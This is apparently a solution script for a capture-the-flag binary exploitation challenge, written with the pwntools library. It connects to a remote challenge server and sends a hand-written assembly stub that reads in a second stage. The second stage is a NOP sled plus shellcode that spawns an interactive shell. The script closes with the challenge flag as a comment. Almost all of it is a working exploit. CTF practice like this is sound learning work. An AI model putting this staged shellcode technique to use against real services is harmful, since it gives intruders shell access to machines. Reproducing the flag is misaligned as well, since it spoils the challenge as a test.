from pwn import *
elf = context.binary = ELF("./chall")
# p = process()
p = remote("ctf-chall.stembascc.com",5212)
payload = asm("""
mov al,3
mov dl,200
int 0x80
""")
payload2 = asm("nop") * 50
payload2 += asm(shellcraft.sh())
p.send(payload)
p.send(payload2)
write("payload",payload)
p.interactive()

# Flag: SELEKSI{buff3r_0verflow_u51ng_as5embly}